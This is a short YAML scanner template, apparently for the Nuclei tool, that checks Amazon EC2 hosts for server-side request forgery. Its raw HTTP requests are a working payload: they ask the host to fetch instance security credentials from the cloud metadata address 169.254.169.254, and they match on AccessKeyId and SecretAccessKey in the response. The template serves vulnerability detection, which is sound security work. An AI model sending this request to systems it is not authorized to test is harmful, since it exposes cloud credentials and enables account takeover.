id: amazon-ec2-ssrf
info:
  name: Amazon EC2 - Server-side request forgery (SSRF)
  author: DhiyaneshDk
  severity: critical
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 9.3
    cwe-id: CWE-441
  metadata:
    verified: true
    shodan-query: 'Server: EC2ws'
    impact: The vulnerability of Amazon EC2 to SSRF can have a significant impact
      on the security of its users' data and applications, potentially leading to
      data breaches and cyberattacks.
    recommendation: I highly recommend implementing proper security measures to prevent
      server-side request forgery (SSRF) attacks when using Amazon EC2.
  tags: aws,ec2,ssrf,amazon
  description: Amazon EC2 has a server-side request forgery vulnerability (SSRF).
requests:
- raw:
  - 'GET {{BaseURL}}/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
    HTTP/1.1

    Host: {{Hostname}}


    '
  - '@tls-sni: {{Hostname}}

    GET http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
    HTTP/1.1

    Host: {{Hostname}}


    '
  stop-at-first-match: true
  unsafe: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - AccessKeyId
    - SecretAccessKey
    condition: and
  - type: status
    status:
    - 200
